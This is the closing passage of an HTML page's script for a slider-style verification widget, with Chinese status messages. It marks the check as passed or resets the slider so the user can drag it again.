        text.textContent = '✓ 验证通过';
        input.value = '1';
    } else {
        var thumb = document.getElementById('scThumb');
        var fill = document.getElementById('scFill');
        var text = document.getElementById('scText');
        
        thumb.style.left = '2px';
        fill.style.width = '0';
        text.textContent = '请按住滑块拖动到最右侧';
    }
}
</script>
</body>
</html>
